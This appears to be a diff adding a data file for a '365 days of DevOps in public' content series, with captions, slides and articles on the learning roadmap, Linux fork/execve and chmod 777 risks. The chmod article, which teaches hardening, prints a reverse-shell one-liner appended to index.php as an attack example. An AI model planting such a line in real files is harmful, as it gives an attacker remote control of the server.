+          { id: "p6_m12", name: "Month 12: 7-Tier Capstone & Finale (331–365)", range: [331, 365] }
+        ]
+      }
+    ];
+
+    const SPECIAL_DAYS = {
+      1: {
+        title: "Committing to 365 Days of Cloud & DevOps in Public",
+        pillar: "Personal Journey / Learn",
+        hook: "Most people wait until they feel like an expert to share their work. Today, I'm doing the opposite: documenting 365 days in public.",
+        captions: {
+          instagram: "Day 1 of 365 🚀\n\nMost engineers wait until they feel like an 'expert' to share their knowledge. Today, I'm doing the exact opposite.\n\nOver the next 365 days, I am committing to documenting every single breakthrough, broken YAML file, kernel trace, and architecture design in public.\n\nHere is what is inside today's carousel 👉\n1️⃣ The 4-Stage Learning Engine (Learn → Build → Document → Explain)\n2️⃣ The 6 Core Engineering Pillars (Linux to SRE)\n3️⃣ The Standards: Zero generic motivational quotes, 100% real code\n\nSwipe through for the 6-stage engineering roadmap! 📌\n\nAll configs and architectures will be open-sourced in our public GitHub repo. Let's build together.",
+          twitter: "Most engineers wait until they're Senior to share their work. Today I'm doing the opposite.\n\nCommitting to 365 days of Cloud Infrastructure & DevOps in public:\n\n• Zero generic quotes\n• 100% real configs & post-mortems\n• Open-source GitHub repos\n\nHere's the 365-day roadmap in 5 slides 🧵👇",
+          short: "Day 1 of 365: Committing to 365 consecutive days of Cloud & DevOps in public. No generic motivation—just real code, Linux internals, and cloud architectures. Swipe through for the roadmap! 🚀"
+        },
+        hashtags: ["#DevOps", "#CloudEngineering", "#Linux", "#LearnInPublic", "#InfrastructureAsCode", "#Kubernetes"],
+        networking: "🎯 Daily Action: Connect with 3 Senior DevOps/Cloud engineers. Comment on a recent technical post highlighting one insight they shared.",
+        article: "---\ntitle: \"Committing to 365 Days of Cloud Infrastructure & DevOps in Public\"\npublished: true\ndescription: \"Why learning in public beats passive consumption, the 4-stage engineering engine, and the complete 365-day curriculum from Linux kernels to GitOps.\"\ntags: devops, cloud, career, learninpublic\ncanonical_url: \"https://github.com/your-username/365-days-of-devops/blob/main/articles/day-001.md\"\ncover_image: \"../assets/day_001/slide_1_hook.jpg\"\n---\n\n# Committing to 365 Days of Cloud Infrastructure & DevOps in Public\n\n> **\"Most engineers wait until they feel like an expert to share their knowledge. Today, I am doing the exact opposite: documenting 365 consecutive days of cloud infrastructure and systems engineering in public.\"**\n\n---\n\n## 1. The Trap of Passive Consumption\n\nIn software engineering and cloud infrastructure, there is an insidious trap known as the **Tutorial Illusion**:\nYou watch a 4-hour video course on Kubernetes. You read a 50-page guide on Terraform modules. Everything clicks in the moment. You nod along. \n\nThen, Monday morning arrives at work:\n- An Amazon EKS node group goes into `NotReady` state during a peak traffic spike.\n- A Terraform state file locks with conflicting MD5 checksums across remote S3 backends.\n- A Linux container kernel OOM-kills a mission-critical Go microservice.\n\nSuddenly, you realize that watching someone else build a cluster does not equal the muscle memory required to debug a distributed system under fire.\n\nTrue engineering competency is forged through three non-negotiable realities:\n1. **Building non-trivial architectures from scratch.**\n2. **Breaking things intentionally and diagnosing the root cause through telemetry.**\n3. **Explaining complex systems with clarity and precision to your peers.**\n\nStarting today, I am embarking on a **365-Day Journey of Cloud Infrastructure, DevOps, and Systems Engineering**. Every day, I will publish actionable code, real failure post-mortems, architectural diagrams, and production configs.\n\n---\n\n## 2. The 4-Stage Continuous Learning Engine\n\nTo maintain extreme quality and avoid burnout across 365 consecutive days, this journey is governed by a strict operational loop:\n\n```text\n┌─────────────────────────────────────────────────────────┐\n│              THE 4-STAGE LEARNING ENGINE                 │\n│                                                         │\n│  [1. LEARN]      Deep dive into first principles        │\n│        │         (Kernel, RFCs, official specs)         │\n│        ▼                                                │\n│  [2. BUILD]      Construct real infrastructure          │\n│        │         (Terraform, K8s, Docker, Go, Python)   │\n│        ▼                                                │\n│  [3. DOCUMENT]   Write repeatable, versioned code       │\n│        │         (Open-source GitHub repositories)      │\n│        ▼                                                │\n│  [4. EXPLAIN]    Synthesize high-signal breakdowns      │\n│                  (Carousels, articles, post-mortems)    │\n└─────────────────────────────────────────────────────────┘\n```\n\n### Stage 1: Learn (First Principles)\nWe do not copy random StackOverflow snippets. We read Linux manual pages, RFC specifications, Kubernetes design proposals, and AWS whitepapers. When examining Docker containers, we look at `clone(2)`, `unshare(2)`, and `cgroups(7)`, not just `docker run`.\n\n### Stage 2: Build (Production-Grade Systems)\nToy \"Hello World\" tutorials are strictly prohibited. Every project must feature:\n- Health check probes (`liveness`, `readiness`, `startup`).\n- Resource boundaries (`cpu: 250m`, `memory: 512Mi`).\n- Automated CI/CD pipelines with secret scanning and static analysis.\n- Telemetry endpoints exporting Prometheus metrics.\n\n### Stage 3: Document (Reproducibility)\nIf it is not in Git, it does not exist. All code, Terraform state definitions, Dockerfiles, and Helm charts developed throughout this 365-day program are versioned and open-sourced.\n\n### Stage 4: Explain (The Feynman Technique)\nIf you cannot explain how Linux cgroups enforce memory limits to a junior engineer, you do not truly understand cgroups. Synthesizing complex concepts into visual carousels and technical articles forces maximum clarity.\n\n---\n\n## 3. The 6 Core Technical Pillars\n\nOver the next 365 days, our curriculum spans six progressive engineering phases:\n\n```text\n365-Day Curriculum Progression:\n[Phase 1: Days 001-030] ➔ Linux Internals, Networking & Python/Bash Automation\n[Phase 2: Days 031-090] ➔ Container Systems, Kubernetes & Multi-Cloud Infrastructure\n[Phase 3: Days 091-180] ➔ Build in Public: 3 Flagship Enterprise Projects\n[Phase 4: Days 181-270] ➔ SRE Telemetry, Zero-Trust Security & eBPF Deep Dives\n[Phase 5: Days 271-330] ➔ High-Scale System Design, Chaos Engineering & Production\n[Phase 6: Days 331-365] ➔ 7-Tier Capstone Architecture, Reputation & Mentorship\n```\n\n### Pillar 1: Linux & Systems Internals (Days 001–030)\n- Inodes, VFS (Virtual File System), and POSIX permission math.\n- The Linux boot process: BIOS/UEFI ➔ GRUB ➔ Kernel init ➔ Systemd PID 1.\n- Process states: `R` (running), `S` (interruptible sleep), `D` (uninterruptible disk sleep), and `Z` (zombie reaping).\n- Networking stack: TCP 3-way handshake, SYN floods, socket buffers, and iptables/nftables packet filtering.\n\n### Pillar 2: Containerization & Cloud Native (Days 031–090)\n- Container primitives: Namespaces (`pid`, `net`, `mnt`, `ipc`, `uts`, `user`) and Cgroups v2.\n- Multi-stage Dockerfile optimization: Reducing image sizes from 1.2GB to 18MB via Distroless and Alpine.\n- Kubernetes Control Plane: API Server reconciliation, etcd Raft consensus, Kubelet PLEG loops.\n- Infrastructure as Code: Terraform modular design, remote state locking with DynamoDB, drift detection.\n\n### Pillar 3: End-to-End Enterprise Projects (Days 091–180)\n1. **Zero-Trust Secure CI/CD Supply Chain**: GitOps with ArgoCD, Cosign cryptographic image signing, Trivy vulnerability gates.\n2. **Multi-Region Resilient Kubernetes Platform**: Amazon EKS across multiple availability zones, Karpenter autoscaling, Cilium eBPF CNI.\n3. **Cloud-Agnostic Observability Stack**: OpenTelemetry Collector, Prometheus, Grafana, and Jaeger distributed tracing.\n\n### Pillar 4: SRE, Chaos & Security (Days 181–270)\n- Service Level Objectives (SLOs), Error Budgets, and alerting without burnout.\n- Chaos Engineering: Simulating packet drop, CPU thrashing, and AZ blackholes with Chaos Mesh.\n- eBPF (Extended Berkeley Packet Filter): Tracing system calls and kernel probes in real-time with zero overhead.\n\n### Pillar 5: System Design & Production Readiness (Days 271–330)\n- Distributed caching (Redis cluster sharding, cache stampede prevention).\n- Asynchronous event streaming (Kafka partition rebalancing, consumer lag metrics).\n- Zero-downtime database schema migrations in production.\n\n### Pillar 6: Capstone Architecture & Community (Days 331–365)\n- Architecting a complete 7-tier production-grade cloud platform from bare metal to global DNS.\n- Authoring comprehensive post-mortems and mentoring the next generation of engineers.\n\n---\n\n## 4. The Rules of Engagement\n\nTo keep this endeavor authentic and high-signal, I am holding myself to four non-negotiable rules:\n\n1. **Zero Generic Quotes**: You will never see generic AI motivational platitudes. Every post must teach a specific concept, show real code, or diagnose an engineering failure.\n2. **Reproducible Code Only**: All commands and YAML manifests must be tested against real environments before publication.\n3. **Blameless Post-Mortems**: When deployments fail or scripts destroy resources (which will inevitably happen), I will document the post-mortem transparently.\n4. **Consistency Over Intensity**: 1 hour of focused engineering and writing every day consistently outperforms sporadic 12-hour weekend binges.\n\n---\n\n## 5. How to Follow Along and Collaborate\n\nAll code, configurations, slides, and articles are open-sourced in our public GitHub repository:\n- **GitHub Repository**: `https://github.com/your-username/365-days-of-devops`\n- **Daily Carousels**: 5-slide visual breakdowns on LinkedIn & Instagram.\n- **Deep-Dive Articles**: Weekly long-form publications on Dev.to and Medium.\n\nIf you are a student, junior engineer, senior architect, or hiring manager passionate about distributed systems and cloud infrastructure, let's connect:\n- Drop a star on the GitHub repo.\n- Leave a comment sharing the biggest production outage you have ever debugged.\n- Follow along daily as we build, break, and master modern cloud engineering together.\n\n**Day 1 begins now. Let's build.**\n",
+        slides: [
+          { tag: "ROADMAP", title: "CLOUD INFRASTRUCTURE & DEVOPS ROADMAP", text: "Mastering modern production infrastructure: from Linux kernel internals to multi-region cloud platforms.", list: ["Zero generic fluff", "100% production-tested code", "Blameless architecture post-mortems"] },
+          { tag: "PHILOSOPHY", title: "THE 4-STAGE LEARNING ENGINE", text: "A continuous feedback loop designed to build genuine deep technical capability:", list: ["1. LEARN: First-principles systems", "2. BUILD: Production architectures", "3. DOCUMENT: Open-source specs", "4. EXPLAIN: High-signal breakdowns"] },
+          { tag: "CURRICULUM", title: "THE 6 CORE TECHNICAL PILLARS", text: "The engineering domains required for senior platform engineering:", list: ["• Systems & Linux Internals", "• Computer Networking & TLS", "• Containers & Cgroups Isolation", "• Terraform Infrastructure as Code", "• Kubernetes & ArgoCD GitOps", "• SRE Telemetry & Observability"] },
+          { tag: "STANDARDS", title: "THE RULES OF ENGAGEMENT", code: "// Standards for production excellence:\nconst STANDARDS = {\n  fluff: false,\n  real_configs: true,\n  github_proof: true,\n  blameless_postmortems: true\n};" },
+          { tag: "SPEC", title: "OPEN-SOURCE SYSTEM SPECIFICATIONS", text: "All architecture diagrams, configurations, and post-mortems are maintained in our public repository.", list: ["Star & clone the repository", "Follow for architecture breakdowns", "Building reliable systems together"] }
+        ]
+      },
+      2: {
+        title: "What Happens When You Type a Command in Linux?",
+        pillar: "Teach / OS Internals",
+        hook: "You type ls -l and hit Enter. It executes in 2 milliseconds. But beneath the surface, your OS just executed 5 choreographed system calls.",
+        captions: {
+          instagram: "Ever wondered what Linux actually does between hitting Enter and seeing terminal output? 💻\n\nIt happens in 2 milliseconds, but under the hood, your OS executes 5 choreographed system calls:\n\n1️⃣ Tokenization: Splitting stdin into binary and arguments\n2️⃣ $PATH Resolution: Searching /usr/bin for executable files\n3️⃣ The fork() Call: Creating a duplicate child address space\n4️⃣ The execve() Call: Overwriting memory with the new program code\n5️⃣ Exit & wait(): Reaping exit code 0 back to parent shell\n\nSwipe through the carousel for the complete system call diagram 👉\n\nUnderstanding this is how you master Docker entrypoint signal debugging! 📌",
+          twitter: "You type 'ls -l' and hit Enter. It takes 2ms.\n\nBeneath the surface, the Linux kernel just ran 5 choreographed operations:\n\n• Tokenization\n• $PATH lookup\n• fork() clone\n• execve() memory rewrite\n• wait() exit code collection\n\nHere's the exact breakdown in 5 slides 🧵👇",
+          short: "What actually happens when you press Enter in a Linux terminal? Here is the 2-millisecond breakdown of fork(), execve(), and $PATH resolution. Swipe through! 💻"
+        },
+        hashtags: ["#Linux", "#OperatingSystems", "#DevOps", "#SystemsEngineering", "#SoftwareEngineering"],
+        networking: "🎯 Daily Action: Search #Linux on LinkedIn. Find a post discussing Linux server setups and share how execve() helps debug Docker entrypoints.",
+        article: "---\ntitle: \"What Happens When You Type a Command in Linux? The 2-Millisecond Kernel Journey\"\npublished: true\ndescription: \"A deep dive into system calls, fork(), execve(), $PATH resolution, and copy-on-write memory mechanics.\"\ntags: linux, devops, kernel, operating-systems\ncanonical_url: \"https://github.com/your-username/365-days-of-devops/blob/main/articles/day-002.md\"\ncover_image: \"../assets/day_002/slide_1_hook.jpg\"\n---\n\n# What Happens When You Type a Command in Linux? The 2-Millisecond Kernel Journey\n\n> **\"You type `ls -l` and press Enter. The directory listing appears on your terminal in 2 milliseconds. But beneath the shell prompt, your CPU switched privilege rings and orchestrated 5 fundamental system calls.\"**\n\n---\n\n## 1. Introduction: Deconstructing the Obvious\n\nEvery DevOps engineer, SRE, and sysadmin runs hundreds of Linux commands each day: `ls`, `grep`, `systemctl`, `docker`, `kubectl`.\n\nTo the user, the operation feels instantaneous and trivial:\n```bash\n$ ls -l /var/log\ntotal 1284\n-rw-r--r-- 1 root root  45210 Sep 05 12:00 syslog\n-rw-r----- 1 root adm  129844 Sep 05 12:01 auth.log\n```\n\nHowever, if you cannot explain the exact sequence of kernel events triggered between hitting the **Return** key and the first character rendering via the display server, you will struggle when:\n- A Docker container exits immediately with `Exit Code 0` or `137`.\n- A background worker becomes an unreaped **Zombie process** (`defunct`).\n- A system running out of file descriptors halts with `ENOMEM` or `EAGAIN` during `fork()`.\n\nLet us trace the complete mechanical lifecycle of a command execution in Linux.\n\n---\n\n## 2. Step 1: Keystroke to Stdin (Terminal & Line Discipline)\n\nBefore your shell (`bash`, `zsh`) ever receives the input:\n1. The hardware keyboard generates a physical interrupt (**IRQ 1**).\n2. The Linux keyboard driver translates scan codes into ASCII characters.\n3. The pseudo-terminal driver (**PTY**) processes the characters in **canonical mode** (line-buffered mode), buffering characters until a newline character (`\\n`) is registered.\n4. When you hit Enter, the shell’s event loop—which was blocked on `read(STDIN_FILENO)`—unblocks and retrieves the raw string buffer:\n   ```c\n   \"ls -l /var/log\\n\"\n   ```\n\n---\n\n## 3. Step 2: Tokenization & Alias/Builtin Expansion\n\nThe shell parses the raw input using standard lexical analysis:\n1. **Splitting into tokens**:\n   - Token 0: `ls` (the command)\n   - Token 1: `-l` (flag)\n   - Token 2: `/var/log` (argument)\n2. **Checking for Shell Built-ins**:\n   The shell checks whether `ls` is a built-in function (like `cd`, `export`, `alias`, `exit`).\n   ```bash\n   $ type ls\n   ls is aliased to `ls --color=auto'\n   ```\n   If it is not a built-in, the shell must locate an external binary file on disk.\n\n---\n\n## 4. Step 3: $PATH Resolution via `stat()`\n\nThe shell iterates sequentially through the directories defined in your `$PATH` environment variable:\n```bash\n$ echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n```\n\nFor each directory, the kernel executes the `stat(2)` or `access(2)` system call:\n1. `access(\"/usr/local/sbin/ls\", X_OK)` ➔ `ENOENT` (No such file)\n2. `access(\"/usr/local/bin/ls\", X_OK)` ➔ `ENOENT`\n3. `access(\"/usr/bin/ls\", X_OK)` ➔ **`0` (Success! Executable binary found)**\n\nModern shells cache these results in a hash table so subsequent runs do not perform disk lookups (`hash -r` clears this cache).\n\n---\n\n## 5. Step 4: The Process Clone (`fork` / `clone`)\n\nThe shell cannot simply load `ls` into its own memory space—if it did, the shell process would be destroyed and your terminal window would immediately close when `ls` finished.\n\nTherefore, the shell process (parent) must duplicate itself using the `clone(2)` or `fork(2)` system call:\n\n```c\npid_t pid = fork();\n\nif (pid < 0) {\n    // Fork failed (e.g. system max process limit / ulimit reached)\n    perror(\"fork failed\");\n} else if (pid == 0) {\n    // CHILD PROCESS: We are the new clone\n    execve(binary_path, argv, envp);\n} else {\n    // PARENT PROCESS: Wait for child to finish\n    int status;\n    waitpid(pid, &status, 0);\n}\n```\n\n### Copy-on-Write (COW) Memory Optimization\nHistorically, `fork()` was computationally expensive because duplicating a 1GB shell process required allocating another 1GB of physical RAM.\n\nModern Linux utilizes **Copy-on-Write (COW)**:\n- The parent and child processes share the exact same physical memory pages marked as **read-only**.\n- Memory is only duplicated if either process attempts to write to a page.\n- Since the child will immediately replace its memory via `execve()`, no physical memory copying occurs!\n\n---\n\n## 6. Step 5: Memory Overwrite (`execve`)\n\nOnce inside the child process, it invokes:\n```c\nexecve(\"/usr/bin/ls\", [\"ls\", \"-l\", \"/var/log\", NULL], envp);\n```\n\nThis is where the magic happens:\n1. The kernel releases the child process’s virtual memory mappings.\n2. The kernel parses the binary executable format (**ELF** - Executable and Linkable Format).\n3. The dynamic linker (`/lib64/ld-linux-x86-64.so.2`) maps shared libraries (e.g., `libc.so.6`) into memory.\n4. The instruction pointer (`RIP` register) is set to the entry point (`_start`) of `/usr/bin/ls`.\n5. Execution begins in user space ring 3.\n\n```text\nProcess Lifecycle Sequence:\n[Parent Shell] ─── fork() ───► [Child Shell (PID 4502)]\n      │                               │\n  waitpid()                        execve(\"/usr/bin/ls\")\n      │                               │\n      │                        [Running /usr/bin/ls]\n      │                               │\n      │                             exit(0)\n      │                               │\n[Parent Shell wakes up] ◄── SIGCHLD ──┘\n```\n\n---\n\n## 7. Step 6: Output & Reaping (`waitpid` & Exit Codes)\n\n1. `/usr/bin/ls` opens directory `/var/log` via `openat(2)`, reads directory inodes via `getdents64(2)`, and writes formatted text to file descriptor 1 (`stdout`) via `write(2)`.\n2. When finished, `ls` calls `exit_group(0)`.\n3. The Linux kernel frees memory and file descriptors associated with the child, but retains its entry in the process table (containing its PID, exit code, and resource statistics).\n4. The kernel sends a `SIGCHLD` signal to the parent shell.\n5. The parent shell calls `waitpid()`, reads the exit code (`0`), and reaps the child process.\n6. If the parent fails to call `waitpid()`, the child remains in the process table as a **Zombie process** (`[ls] <defunct>`).\n\n---\n\n## 8. Tracing it Live with `strace`\n\nYou do not need to take my word for it. You can observe this exact choreography on any Linux machine with `strace`:\n\n```bash\n$ strace -f -e trace=clone,execve,wait4 /bin/sh -c \"ls -d /tmp\"\nexecve(\"/bin/sh\", [\"/bin/sh\", \"-c\", \"ls -d /tmp\"], 0x7ffd...) = 0\nclone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD...) = 31245\n[pid 31245] execve(\"/usr/bin/ls\", [\"ls\", \"-d\", \"/tmp\"], 0x55dc...) = 0\n[pid 31245] +++ exited with 0 +++\n--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=31245, si_status=0} ---\nwait4(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 31245\n+++ exited with 0 +++\n```\n\n---\n\n## 9. Key Production Takeaways for DevOps Engineers\n\n1. **Containers are Just Processes**: A Docker container does not run an OS kernel; it executes `clone()` with namespace flags (`CLONE_NEWPID`, `CLONE_NEWNET`) and cgroup limits.\n2. **PID 1 Signal Forwarding**: When you run an app in Docker, your entrypoint binary is PID 1. If PID 1 does not implement `waitpid()` signal handlers, zombie processes will accumulate and exhaust the host's PID limit.\n3. **Execve Replaces Processes**: In Docker entrypoint scripts, always end with `exec \"$@\"` so your application replaces the shell script rather than running as a child process.\n\n---\n\n## Hands-On Exercise\nOpen your terminal and run:\n```bash\nstrace -c ls /var\n```\nReview the system call summary matrix. How many microseconds did your kernel spend in `mmap` vs `openat`? Share your findings in the comments below!\n",
+        slides: [
+          { tag: "COVER", title: "WHAT HAPPENS WHEN YOU HIT ENTER IN LINUX?", text: "The 2-millisecond journey from keystroke to terminal output demystified." },
+          { tag: "PROCESS", title: "1. TOKENIZATION & $PATH RESOLUTION", text: "The shell parses raw stdin into tokens and iterates through the $PATH environment variable to find the executable binary.", code: "$ echo $PATH\n/usr/local/bin:/usr/bin:/bin" },
+          { tag: "KERNEL", title: "2. THE FORK() SYSTEM CALL", text: "The shell cannot run the program in its own process without dying. It duplicates itself using fork().", code: "pid_t pid = fork();\n// Creates child process with isolated memory" },
+          { tag: "EXECUTION", title: "3. EXECVE() OVERWRITES MEMORY", text: "The child process invokes execve(), replacing its address space with the target binary code and executing it.", code: "execve(\"/bin/ls\", argv, envp);" },
+          { tag: "TAKEAWAY", title: "WHY THIS MATTERS FOR DEVOPS", text: "Understanding fork() and execve() explains why zombie processes occur and how Docker entrypoint PID 1 signals work.", list: ["PID 1 signal forwarding", "Zombie & orphan reaping", "Debugging exec crashes"] }
+        ]
+      },
+      4: {
+        title: "Why chmod 777 is an Engineering Red Flag",
+        pillar: "Troubleshoot / Security",
+        hook: "If your answer to a 'Permission Denied' error is chmod 777, you didn't fix the problem. You just created a massive security vulnerability.",
+        captions: {
+          instagram: "Stop using chmod 777 to fix permission errors! 🛑\n\nWhen a deployment fails and someone runs `chmod -R 777 /var/www`, the error goes away—but any compromised process or web shell now has full control over your machine.\n\nSwipe through the carousel for the exact binary math behind octal notation (`600`, `644`, `755`) so you never guess permissions again 👉\n\nKey takeaways:\n🔒 chmod 600 -> SSH Private Keys (Owner only)\n🔒 chmod 644 -> Configs (Owner rw, others r)\n🔒 chmod 755 -> Scripts (Owner rwx, others rx)\n\n👉 Fix ownership with `chown user:group` instead of blowing open permissions!\n\nSave this cheat sheet for your DevOps portfolio 📌",
+          twitter: "If your answer to a 'Permission Denied' error is `chmod 777`, you didn't fix the bug. You opened a critical security hole.\n\nHere is the binary math behind Linux octal notation:\n\n• Read (r) = 4 (100)\n• Write (w) = 2 (010)\n• Exec (x) = 1 (001)\n\nNever guess permissions again. Full cheat sheet in 5 slides 🧵👇",
+          short: "Stop using chmod 777! 🛑 Learn the exact binary math behind 600, 644, and 755 to keep your Linux servers secure. Swipe through for the cheat sheet 👉"
+        },
+        hashtags: ["#CyberSecurity", "#Linux", "#DevOps", "#CloudSecurity", "#SysAdmin", "#PlatformEngineering"],
+        networking: "🎯 Daily Action: Find a security lead or DevOps engineer posting about hardening. Comment on how strict permissions on SSH keys (600) enforce security boundaries.",
+        article: "---\ntitle: \"Why chmod 777 is an Engineering Red Flag: The Unix Permissions Deep Dive\"\npublished: true\ndescription: \"A first-principles guide to POSIX file modes, octal mathematics, and securing container workloads in production.\"\ntags: devops, linux, security, cloud\ncanonical_url: \"https://github.com/your-username/365-days-of-devops/blob/main/articles/day-004.md\"\ncover_image: \"../assets/day_004/slide_1_hook.jpg\"\n---\n\n# Why `chmod 777` is an Engineering Red Flag: The Unix Permissions Deep Dive\n\n> **\"If your immediate reaction to a 'Permission Denied' error is `chmod 777`, you didn't fix the problem. You just created a critical security vulnerability.\"**\n\nWe have all witnessed this scenario in production or staging environments:\nIt is 2:00 AM. A continuous deployment script fails with:\n```bash\nEACCES: permission denied, open '/var/www/app/storage/logs/laravel.log'\n```\n\nFrustrated and fatigued, someone types into the terminal:\n```bash\nsudo chmod -R 777 /var/www/app\n```\n\nThe error message vanishes. The pipeline goes green. The on-call engineer goes back to sleep.\n\n**What actually happened?**\nThe operational symptom was suppressed, but the underlying system boundary was destroyed. Every local process, compromised worker thread, third-party dependency, or unauthenticated web shell now possesses read, write, and execute permissions over your entire application codebase.\n\nIn this deep dive, we will examine the first principles of POSIX file permissions, demystify octal mathematics, analyze real-world privilege escalation vectors, and establish hardened production invariants.\n\n---\n\n## 1. The Anatomy of POSIX File Modes\n\nIn Linux and Unix-like operating systems, every file and directory is represented in the filesystem by an **inode** (index node). The inode does not store the file name; rather, it stores metadata:\n- File size\n- Physical block locations on disk\n- Ownership (User ID / `UID` and Group ID / `GID`)\n- Timestamps (`atime`, `mtime`, `ctime`)\n- **File Mode bits** (16-bit integer encoding file type and access permissions)\n\n### The 3 Permission Scopes\nAccess is evaluated sequentially against three distinct security scopes:\n\n```text\n┌─────────────────┬─────────────────┬─────────────────┐\n│    User (u)     │    Group (g)    │   Others (o)    │\n│ (The File Owner)│ (Assigned Group)│ (The Entire OS) │\n└─────────────────┴─────────────────┴─────────────────┘\n```\n\n1. **User (Owner)**: The specific `UID` that created or owns the file.\n2. **Group**: A collection of users sharing collaborative rights to the resource.\n3. **Others (World)**: Every other process and user on the operating system that is neither the owner nor a member of the file’s group.\n\n---\n\n## 2. The Binary & Octal Mathematics\n\nWhen you run `ls -l`, you see a 10-character string such as:\n```text\n-rwxr-xr-- 1 deployer webgroup 4096 Sep 5 17:00 deploy.sh\n```\n\n- The first character indicates the file type (`-` for regular file, `d` for directory, `l` for symlink).\n- The remaining 9 characters represent three 3-bit triplets:\n  - `rwx` for User\n  - `r-x` for Group\n  - `r--` for Others\n\nEach operation maps directly to a **binary bit flag**:\n\n| Permission | Symbol | Binary Value | Octal Weight | Semantic Meaning |\n|---|---|---|---|---|\n| **Read** | `r` | `100` | **4** | View file contents or list directory entries |\n| **Write** | `w` | `010` | **2** | Modify file contents or create/delete files in directory |\n| **Execute** | `x` | `001` | **1** | Execute binary/script or traverse (`cd`) into directory |\n\n### The Octal Addition Matrix\nTo compute the permission number for any scope, simply sum the octal weights:\n\n$$\\text{Octal Digit} = (r \\times 4) + (w \\times 2) + (x \\times 1)$$\n\n- **7** ($4 + 2 + 1$): Read, Write, and Execute (`rwx`)\n- **6** ($4 + 2 + 0$): Read and Write (`rw-`)\n- **5** ($4 + 0 + 1$): Read and Execute (`r-x`)\n- **4** ($4 + 0 + 0$): Read Only (`r--`)\n- **0** ($0 + 0 + 0$): No permissions (`---`)\n\n---\n\n## 3. Why `777` is Fatal: Real Attack Vectors\n\nWhen you execute `chmod 777 /var/www`, you assign:\n- User = `7` (`rwx`)\n- Group = `7` (`rwx`)\n- **Others = `7` (`rwx`)**\n\n### Attack Vector 1: Arbitrary Code Injection via Web Daemon\nIf your Nginx or Apache server runs under the low-privilege user `www-data`, and an attacker finds a Local File Inclusion (LFI) or file upload bug, they cannot normally overwrite application source code if the code is owned by `deployer` with mode `644`.\n\nUnder `chmod 777`, `www-data` possesses write access. The attacker can directly overwrite `index.php` or `app.py` with a reverse shell payload:\n```bash\necho 'bash -i >& /dev/tcp/10.0.0.99/4444 0>&1' >> /var/www/app/index.php\n```\n\n### Attack Vector 2: Shared Hosting and Multi-Tenant Compromise\nIn Kubernetes nodes or shared Linux hosts where multiple developer services share local disk partitions, any container escaping its sandbox or any co-located service running as `nobody` can read database connection strings, API tokens, and private certificates.\n\n---\n\n## 4. The 3 Golden Production Configurations\n\nIn enterprise production systems, 99% of file workloads fit into three hardened standards:\n\n### 🔒 1. `chmod 600` — Secrets & Private Keys\n* **User**: Read & Write ($4 + 2 = 6$)\n* **Group**: None ($0$)\n* **Others**: None ($0$)\n* **Use Cases**: SSH private keys (`id_rsa`), AWS credential files, TLS private keys, sensitive `.env` files.\n* **Invariant**: OpenSSH will actively refuse to connect if your private key has permissions looser than `600`.\n\n### 🔒 2. `chmod 644` — Configuration Files & Static Assets\n* **User**: Read & Write ($4 + 2 = 6$)\n* **Group**: Read Only ($4$)\n* **Others**: Read Only ($4$)\n* **Use Cases**: `nginx.conf`, application source code, Dockerfiles, Terraform `.tf` files, systemd unit files.\n* **Invariant**: Only the deployment pipeline/root can modify; unprivileged runtimes can only read.\n\n### 🔒 3. `chmod 755` — Executable Binaries & Scripts\n* **User**: Read, Write, Execute ($4 + 2 + 1 = 7$)\n* **Group**: Read & Execute ($4 + 0 + 1 = 5$)\n* **Others**: Read & Execute ($4 + 0 + 1 = 5$)\n* **Use Cases**: Shell scripts (`deploy.sh`), compiled binaries (`/usr/local/bin/app`), directories requiring traversal.\n\n---\n\n## 5. The Real Engineering Solution: Fix Ownership (`chown`)\n\nThe root cause of 95% of \"Permission Denied\" errors is **ownership mismatch**, not permission insufficiency.\n\nIf an application running as `www-data` cannot write to `/var/www/app/storage`, the solution is **not** to allow the entire world to write to it (`777`).\n\nThe proper solution is to assign ownership or group membership to the service identity:\n\n```bash\n# Set owner to deployment user, group to web service user\nsudo chown -R deployer:www-data /var/www/app\n\n# Allow owner full control, group read-only across code\nsudo find /var/www/app -type f -exec chmod 644 {} +\nsudo find /var/www/app -type d -exec chmod 755 {} +\n\n# Grant group write access ONLY to the specific upload/storage directory\nsudo chown -R www-data:www-data /var/www/app/storage\nsudo chmod -R 775 /var/www/app/storage\n```\n\n---\n\n## 6. Audit Your Infrastructure: Finding Reckless `777` Files\n\nRun this one-liner across your production servers or container images to detect risky permission posture:\n\n```bash\n# Find all world-writable files excluding proc and sys\nsudo find / -path /proc -prune -o -path /sys -prune -o -type f -perm -0002 -ls\n```\n\nIf you discover critical configuration files or binaries returned by this command, remediate them immediately.\n\n---\n\n## 7. Summary & Invariants for Platform Teams\n\n1. **`chmod 777` is banned in production.** Enforce this rule in pre-commit hooks and container linter pipelines.\n2. **Fix ownership (`chown`), not permissions (`chmod`).**\n3. **Remember the formula:** Read = 4, Write = 2, Execute = 1.\n4. **Follow the Least Privilege principle:** If a process does not need to execute a file, never grant it `+x`. If it does not need to modify a file, never grant it `+w`.\n\n---\n\n*This article is part of the **365-Day Cloud & DevOps Master Engineering Curriculum**. Follow along as we dissect distributed systems, infrastructure as code, Kubernetes platforms, and production incident post-mortems every single day.*\n",
+        slides: [
+          { tag: "COVER", title: "STOP USING CHMOD 777 IN PRODUCTION", text: "The silent production killer: why open permissions invite remote exploitation and privilege escalation." },
+          { tag: "SCOPES", title: "THE 3 PERMISSION SCOPES", text: "Every Linux file has 3 distinct security scopes:", list: ["User (u): The specific file owner", "Group (g): Users in the file's group", "Others (o): Everyone else on the server"] },
+          { tag: "OCTAL MATH", title: "THE BINARY PERMISSION MATH", text: "Add the binary bit values to calculate octal digits:", code: "Read (r)    = 4  (Binary 100)\nWrite (w)   = 2  (Binary 010)\nExecute (x) = 1  (Binary 001)\n\n4 + 2 + 1 = 7 (Full Access)\n4 + 2 + 0 = 6 (Read/Write)\n4 + 0 + 1 = 5 (Read/Exec)" },
+          { tag: "PRODUCTION", title: "STANDARD SECURE CONFIGURATIONS", text: "The 3 configs every engineer should memorize:", code: "chmod 600 id_rsa      # SSH keys (User only)\nchmod 644 app.conf    # Configs (User rw, others r)\nchmod 755 deploy.sh   # Scripts (User rwx, others rx)" },
